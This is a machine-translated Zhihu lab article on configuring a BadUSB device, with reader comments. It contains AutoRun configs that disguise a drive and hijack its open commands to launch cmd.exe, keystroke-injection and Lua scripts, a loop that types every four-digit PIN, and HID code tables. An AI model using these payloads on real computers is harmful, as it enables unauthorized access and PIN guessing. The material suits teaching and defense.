[Описание эксперимента BadUSB](https://zhuanlan.zhihu.com/p/705425132)

![Курс по информационной безопасности 2 — описание эксперимента BadUsb](https://pica.zhimg.com/70/v2-6f1c11ea9bc36f022c19e1722ca12ce1_1440w.image?source=172ae18b&biz_tag=Post)

# Курс по информационной безопасности 2 — описание эксперимента BadUsb

[![Чжоу Цзинчэн](https://picx.zhimg.com/v2-c11246453be981e4a3ae3f35106b718a_l.jpg?source=32738c0c&needBackground=1)](https://zhuanlan.zhihu.com//www.zhihu.com/people/zhou-jing-cheng-58)

[Чжоу Цзинчэн](https://zhuanlan.zhihu.com//www.zhihu.com/people/zhou-jing-cheng-58)

[![Image 1](https://picx.zhimg.com/v2-2ddc5cc683982648f6f123616fb4ec09_l.png?source=32738c0c)](https://www.zhihu.com/question/48510028)

Обладатель профессионального и технического сертификата по компьютерным технологиям и программному обеспечению

29 человек поставили лайк статье

## **1\. Ключевые инструкции**

![Image 2](https://pic3.zhimg.com/v2-f6467e912d0920ad3aeee08750577d3e_1440w.jpg)

Настройте клавиши

Нажмите и удерживайте кнопку настройки, чтобы вставить его в компьютер и отпустить, он перейдёт в режим конфигурации badusb, который отображается на USB-флешке на компьютере, режим атаки отключён, атака не будет атакована:

![Image 3](https://pica.zhimg.com/v2-86a0e18c3d1b8afef37a8687cae3eed2_1440w.jpg)

USB-флешка, отображаемая при настройке режима

Откройте USB-флешку в USB-флешке.[autorun.inf](https://zhida.zhihu.com/search?content_id=244892190&content_type=Article&match_order=1&q=autorun.inf&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjY1MTI1NzcsInEiOiJhdXRvcnVuLmluZiIsInpoaWRhX3NvdXJjZSI6ImVudGl0eSIsImNvbnRlbnRfaWQiOjI0NDg5MjE5MCwiY29udGVudF90eXBlIjoiQXJ0aWNsZSIsIm1hdGNoX29yZGVyIjoxLCJ6ZF90b2tlbiI6bnVsbH0.HaQp_ddwCnY9bTZzRkoxGKIopgA5bnPpEMy8UUMviu4&zhida_source=entity)То есть конфигурационный файл, где упрощённая версия содержит только один конфигурационный файл — autorun.inf. Премиум-версия имеет два конфигурационных файла: autorun.inf для атак на автозапуск,[luac.out](https://zhida.zhihu.com/search?content_id=244892190&content_type=Article&match_order=1&q=luac.out&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjY1MTI1NzcsInEiOiJsdWFjLm91dCIsInpoaWRhX3NvdXJjZSI6ImVudGl0eSIsImNvbnRlbnRfaWQiOjI0NDg5MjE5MCwiY29udGVudF90eXBlIjoiQXJ0aWNsZSIsIm1hdGNoX29yZGVyIjoxLCJ6ZF90b2tlbiI6bnVsbH0.tgzY1hcHIJA2_OJYkZggg1BXX2F4EQ-fsKe7zkIkpLU&zhida_source=entity)Используется для bad\_usb атак.

![IImage4](https://pic4.zhimg.com/v2-7e5005bae2e5abbd33f533348844a09d_1440w.jpg)

Конфигурационные файлы

Используйте Notepad, чтобы открыть профиль и компиляцию

## 2\. Описание профиля

Существует два способа атаки: атаки AutoRun и атаки BadUSB

### 1\. Атака AutoRun

Пример конфигурации (содержимое файла autorun.inf):

```text
;AutoRun攻击的配置块，支持同时进行两种攻击。
[AutoRun]
autoplay=true

;伪装的U盘图标
icon=c:\windows\system32\shell32.dll,79

;驱动器名称
label=Kingston

;攻击载荷，此处为调用cmd打开网页
open=cmd.exe /c "start http://www.nnnxxx.cn"
run=cmd.exe /c "start http://www.nnnxxx.cn"

;劫持右键菜单
shell\open=打开(&amp;O)
shell\open\Command=cmd.exe /c "start http://www.nnnxxx.cn" 
shell\opennewwindow=在新窗口中打开(&amp;E) 
shell\opennewwindow\Command=cmd.exe /c "start http://www.nnnxxx.cn"
```

Триггерным условием атаки Autorun является открытие диска жертвой. Когда жертва открывает диск, атака автоматически настраивается.

### 2\. Упрощённая версия bad\_usb атаки

Принцип атаки badusb заключается в маскировке под клавиатуру и автоматическом вводе настроенных клавиш в компьютер. Простая автоматическая поддержка ограничена, и все поддерживаемые команды следующие:

```text
[Enter]：按下回车键
[Shift]：按下Shift键
[Capslock]：切换大小写
[Win]：按下Win键
[Win+R]：打开“运行”窗口
[Alt+F4]：关闭当前窗口
[Win+D]：显示桌面
[Win+L]：锁定计算机
[Win+E]：打开Windows资源管理器
[Ctrl+Alt+Del]：打开安全选项
[Delay]：等待500毫秒，两个Delay为1秒，以此类推
[Format]：格式化储存(U盘自身）
正常按键比如a-z直接输入即可
```

В упрощённой версии конфигурационный файл badusb — это тот же файл, что и autorun, просто добавьте следующее содержимое, упрощённая версия — пример (содержимое файла autorun.inf):

```text
[BadUSB]
[Win+R]
[Delay][Delay]
notepad[Enter]
[Delay]
Hello World[Enter]
[Win+R]
[Delay]
[Delay]
https://www.nnnxxx.cn
[Enter]
[BadUSB]
;AutoRun攻击的配置块，支持同时进行两种攻击。
[AutoRun]
autoplay=true

;伪装的U盘图标
icon=c:\windows\system32\shell32.dll,79

;驱动器名称
label=Kingston

;攻击载荷，此处为调用cmd打开网页
open=cmd.exe /c "start http://www.nnnxxx.cn"
run=cmd.exe /c "start http://www.nnnxxx.cn"

;劫持右键菜单
shell\open=打开(&amp;O)
shell\open\Command=cmd.exe /c "start http://www.nnnxxx.cn" 
shell\opennewwindow=在新窗口中打开(&amp;E) 
shell\opennewwindow\Command=cmd.exe /c "start http://www.nnnxxx.cn"
```

## 3\. Продвинутая версия bad\_usb атаки

Продвинутая версия использует высокопроизводительные чипы и хранилище, а также имеет улучшенные функции, но сложность использования также значительно возросла, и рекомендуется использовать простую версию для новичков. Главное отличие премиум-версии от простой версии заключается в том, что продвинутая версия предоставляет полный язык программирования, поддерживающий управляющие операторы, например, если, хотя и т.д., пользователи могут самостоятельно писать более сложные программы, а продвинутая версия поддерживает все симуляции клавиш и мыши, поддерживая случайные числа и пользовательские задержки.

Встроенный интерпретатор премиум-версии — Lua, поддерживающий Lua 4.0 и предыдущий синтаксис.

Продвинутая версия автозапусковых атак также использует конфигурационный файл autorun.inf. Однако премиум-версия badUsb-атак больше не заимствует файл autorun.inf, а имеет отдельный конфигурационный файл luac.out, что означает, что премиум-версия имеет два конфигурационных файла: один — autorun.inf, который используется для автозапуска. Один из них — файл luac.out, который используется для атак badUSB.

Например, напишите следующий скрипт lua, предварительно скомпилируйте его и вставьте на USB-флешку

```text
pp=1000
i=3
delay(1000)
raw_key(128,21)
delay(500)
keys('notepad')
keys('\n')
delay(500)
while i&gt;1 do   
   keys('Hello-') 
   delay(pp)
   i = i-1
end 
delay(500)
raw_key(128,21)
delay(500)
keys('http://www.nnnxxx.cn') 
keys('\n')
delay(pp)
mouse(0,100,0,0)
delay(pp)
mouse(0,0,100,0)
delay(pp)
null_mouse();
```

Инструмент управляет компьютером выводом 10 строк bb, затем открывает Run, [вводит http:// nnnxxx.cn](https://link.zhihu.com/?target=http%3A//nnnxxx.cn) enter, затем перемещает мышь на 100 пикселей вправо и на 100 пикселей вниз.

Другие примеры включают:

**Вывод четырёхзначного пароля 0000-9999:**

```text
for i = 0, 9 do
    for j =0,9 do
       for k=0,9 do
          for m=0,9 do
          raw_key(0,30+i)
          raw_key(0,30+j)
          raw_key(0,30+k)
          raw_key(0,30+m)
          end
       end
    end
end
```

**Проводите пальцем вверх по экрану телефона каждую секунду**

```text
while 1 do
null_mouse()       
delay(15)
mouse(1,0,0,0) 
delay(10)
mouse(1,0,158,0)
delay(10)
mouse(1,0,158,0)
delay(10)
mouse(1,0,158,0)
delay(10)
mouse(1,0,158,0) 
delay(10)
null_mouse()

delay(2000) 
mouse(0,0,98,0)
delay(5)
mouse(0,0,98,0)
delay(5)
mouse(0,0,98,0)
delay(5)
mouse(0,0,98,0)
delay(5)
delay(2000)
end
```

Другие функции могут разрабатываться пользователями

После написания lua-скрипта нужно использовать luac4 для предварительной компиляции скрипта, а затем поместить luac.out, сгенерированный прекомпиляцией, в корневую папку USB-флешки.

Скачать адрес luac4: [LuaBinaries - luac4](https://link.zhihu.com/?target=http%3A//nnnxxx.cn/attachment/tools/luac4.rar)

Команды компиляции:

```text
luac4.exe  -s  脚本名
脚本名替换为你的脚本名称，命令执行完会在当前目录生成luac.out，把这个文件拷到U盘根目录即可。
```

Описание функции экспорта:

```text
keys(string str):连续输入一串字符，参数为字符串，支持转义字符，比如\n
raw_key(int function_key, int str_key):原始按键，只接受十进制功能键码和一个普通键码。
mouse(int a, int b, int c, int d): 鼠标操作，四个参数为HID的四字节码，十进制。
null_mouse(): 释放鼠标所有按键。
delay(int dura):延迟函数，参数为毫秒数。
random(int max):生成一个不大于max的随机整数
format():格式化U盘，盘是特殊格式，只能使用这个命令格式化，不能在windows下手动格式化。
```

Код клавиатуры:

```text
/* HIDKey */
//HIDKey[0]
// 0字节bit位：多个功能键同时按则将键码相加即可
//    0：左Ctrl
//    1: 左Shift
//    2: 左Alt
//    3: 左GUI
//    4：右Ctrl
//    5：右Shift
//    6：右Alt
//    7：右GUI
//   1字节保留
//   2-7字节为按键
```

![IMImag5](https://pic1.zhimg.com/v2-9b8bbf508dc02aa1c0f4aacbb91a4ce8_1440w.jpg)

Соответствующий код кнопки

Код мыши:

```text
*鼠标发送给PC的数据每次4个字节
*BYTE1 BYTE2 BYTE3 BYTE4
*定义分别是：
*BYTE1 –
|–bit7: 1 表示 Y 坐标的变化量超出－256 ~ 255的范围,0表示没有溢出
|–bit6: 1 表示 X 坐标的变化量超出－256 ~ 255的范围，0表示没有溢出
|–bit5: Y 坐标变化的符号位，1表示负数，即鼠标向下移动
|–bit4: X 坐标变化的符号位，1表示负数，即鼠标向左移动
|–bit3: 恒为1
|–bit2: 1表示中键按下
|–bit1: 1表示右键按下
|–bit0: 1表示左键按下
BYTE2 – X坐标变化量，与byte的bit4组成9位符号数,负数表示向左移，正数表右移。用补码表示变化量
BYTE3 – Y坐标变化量，与byte的bit5组成9位符号数，负数表示向下移，正数表上移。用补码表示变化量
BYTE4 – 滚轮变化。
```

## 3\. Описание нападения

1\. После завершения настройки сохраните всплывающую USB-флешку, не нажимайте кнопку, чтобы вставить её в компьютер для проведения атаки. Простая версия медленнее и начинает атаковать примерно через 7-10 секунд после ввода.

2\. Моделируется принцип атаки BadUSB[Клавиатура HID](https://zhida.zhihu.com/search?content_id=244892190&content_type=Article&match_order=1&q=HID%E9%94%AE%E7%9B%98&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjY1MTI1NzcsInEiOiJISUTplK7nm5giLCJ6aGlkYV9zb3VyY2UiOiJlbnRpdHkiLCJjb250ZW50X2lkIjoyNDQ4OTIxOTAsImNvbnRlbnRfdHlwZSI6IkFydGljbGUiLCJtYXRjaF9vcmRlciI6MSwiemRfdG9rZW4iOm51bGx9.Qlp-NhFTyd0aV4xi8pRieUss3FKZ9gAyx_BArnhaV4o&zhida_source=entity)Теоретически она поддерживает все системы, поддерживающие HID, такие как Linux, Windows, Android и др., но разные команды операционной системы отличаются, например, клавиша WIN+R открыта и запускается в Windows, а другие системы не обязательно являются такими и могут быть настроены как разные кнопки для разных систем.

Отредактировано 2025-04-01 11:42 ・Shandong

[

Безопасность информационных сетей

](<https://zhuanlan.zhihu.com//www.zhihu.com/topic/19923985>)

[

Информационная безопасность

](<https://zhuanlan.zhihu.com//www.zhihu.com/topic/19561983>)

[

Сетевая информационная безопасность

](<https://zhuanlan.zhihu.com//www.zhihu.com/topic/20551634>)

Согласен, 2912 рецензий

Предоставить общий доступ

типаКоллекцияЗапрос на переиздание

![Image 6](https://pic1.zhimg.com/v2-d41c2ceaed8f51999522f903672a521f_l.jpeg)

Не вошёл в систему пользователей

12 рецензий

По умолчанию

Последние

[![Дыхательное поле](https://picx.zhimg.com/v2-fe549a427304bc6ca1755dd864539f49_l.jpg?source=06d4cd63)](https://www.zhihu.com/people/8e2e927367913eadf82810b8f8ce294d)

[Дыхательное поле](https://www.zhihu.com/people/8e2e927367913eadf82810b8f8ce294d)

Могу ли я подключить Linux?

12-01 · Гуандун

Ответитьтипа

[![Jaxon005](https://picx.zhimg.com/v2-12909f285de0835cb9d2fbb10928c9c3_l.jpg?source=06d4cd63)](https://www.zhihu.com/people/96173c2debf73ce00c00607ccfd0e894)

[Jaxon005](https://www.zhihu.com/people/96173c2debf73ce00c00607ccfd0e894)

Можно ли включить только HID? Не включайте USB-память

08-19 · Гуандун

Ответитьтипа

[![ХЬЮГО](https://pic1.zhimg.com/v2-abed1a8c04700ba7d72b45195223e0ff_l.jpg?source=06d4cd63)](https://www.zhihu.com/people/84d997dc69a1bbe7a6cb9d3750642eac)

[ХЬЮГО](https://www.zhihu.com/people/84d997dc69a1bbe7a6cb9d3750642eac)

Почему мои ключи ('\\n') не могут выполнить возврат каретки?

07-02 · Гуандун

Ответитьтипа

[![Я вечный друг](https://pic1.zhimg.com/v2-abed1a8c04700ba7d72b45195223e0ff_l.jpg?source=06d4cd63)](https://www.zhihu.com/people/1f6d52db69bee01261edf073808bafe3)

[Я вечный друг](https://www.zhihu.com/people/1f6d52db69bee01261edf073808bafe3)

raw\_key (0,40)  
можно заменить на вышеуказанный код

11-21 · Пекин

Ответитьтипа

[![1238](https://picx.zhimg.com/v2-0bb3bda8a80832af3374ec5e2dd2f6fe_l.jpg?source=06d4cd63)](https://www.zhihu.com/people/7008619c231ea51770e75dfd9180afeb)

[1238](https://www.zhihu.com/people/7008619c231ea51770e75dfd9180afeb)

delay(200)  
  
для numberOfCycles=0,5 do  
delay(10)  
  
if numberOfCycles>0 then  
mouse( 0, 70, 0, 0)  
end  
delay(10)  
  
mouse(1, 0, 0, 0)  
delay(10)  
для rightOffset=0,9 do  

04-25 · Фуцзянь

Ответитьтипа

[![1238](https://pic1.zhimg.com/v2-0bb3bda8a80832af3374ec5e2dd2f6fe_l.jpg?source=06d4cd63)](https://www.zhihu.com/people/7008619c231ea51770e75dfd9180afeb)

[1238](https://www.zhihu.com/people/7008619c231ea51770e75dfd9180afeb)

Братья, есть ли способ управлять траекторией движения мыши в зависимости от арки? Я чувствую, что могу работать только с клавиатуры и левыми и правыми средними кнопками мыши, не могу найти другие функции и не могу скомпилировать ответы на вопрос ИИ-интеллекта lua4.

04-25 · Фуцзянь

Ответитьтипа

[![AgenTSD](https://picx.zhimg.com/v2-abed1a8c04700ba7d72b45195223e0ff_l.jpg?source=06d4cd63)](https://www.zhihu.com/people/7761d5b1a4f3707ad9e7f9dbe9ef0a40)

[AgenTSD](https://www.zhihu.com/people/7761d5b1a4f3707ad9e7f9dbe9ef0a40)

Причина, по которой мои кодовые клавиши ('\\n') не выполняются нормально, в том, что я не могу ввести cmd

04-18 · Чжэцзян

Ответитьтипа

[![ХЬЮГО](https://picx.zhimg.com/v2-abed1a8c04700ba7d72b45195223e0ff_l.jpg?source=06d4cd63)](https://www.zhihu.com/people/84d997dc69a1bbe7a6cb9d3750642eac)

[ХЬЮГО](https://www.zhihu.com/people/84d997dc69a1bbe7a6cb9d3750642eac)

+1

07-02 · Гуандун

Ответитьтипа

[![Сертификация](https://picx.zhimg.com/v2-abed1a8c04700ba7d72b45195223e0ff_l.jpg?source=06d4cd63)](https://www.zhihu.com/people/78b462c579ceffa5074e55a1f821b0e5)

[Сертификация](https://www.zhihu.com/people/78b462c579ceffa5074e55a1f821b0e5)

![Image 7](https://picx.zhimg.com/v2-4812630bc27d642f7cafcd6cdeca3d7a.jpg?source=88ceefae)

Что делать, если вы не вошли в систему, что делать с пользователями

02-18 · Шаньдун

Ответитьтипа

[![Хакер](https://picx.zhimg.com/v2-abed1a8c04700ba7d72b45195223e0ff_l.jpg?source=06d4cd63)](https://www.zhihu.com/people/52335dfa7a207d0273bf7103df5f96a9)

[Хакер](https://www.zhihu.com/people/52335dfa7a207d0273bf7103df5f96a9)

Windows

01-11 · Хэбэй

Ответитьтипа

[![Хакер](https://pica.zhimg.com/v2-abed1a8c04700ba7d72b45195223e0ff_l.jpg?source=06d4cd63)](https://www.zhihu.com/people/52335dfa7a207d0273bf7103df5f96a9)

[Хакер](https://www.zhihu.com/people/52335dfa7a207d0273bf7103df5f96a9)

Как открыть CMD здесь

01-11 · Хэбэй

Ответитьтипа

[![Сварочный аппарат](https://pica.zhimg.com/v2-51c4c5b07e1116f7eac779572bb1597e_l.jpg?source=06d4cd63)](https://www.zhihu.com/people/b917d0a05d348da6bffdece05607b9a2)

[Сварочный аппарат](https://www.zhihu.com/people/b917d0a05d348da6bffdece05607b9a2)

win+r

01-27 · Шаньси

Ответитьтипа

![Image 8](https://pic1.zhimg.com/v2-d41c2ceaed8f51999522f903672a521f_l.jpeg)

Не вошёл в систему пользователей
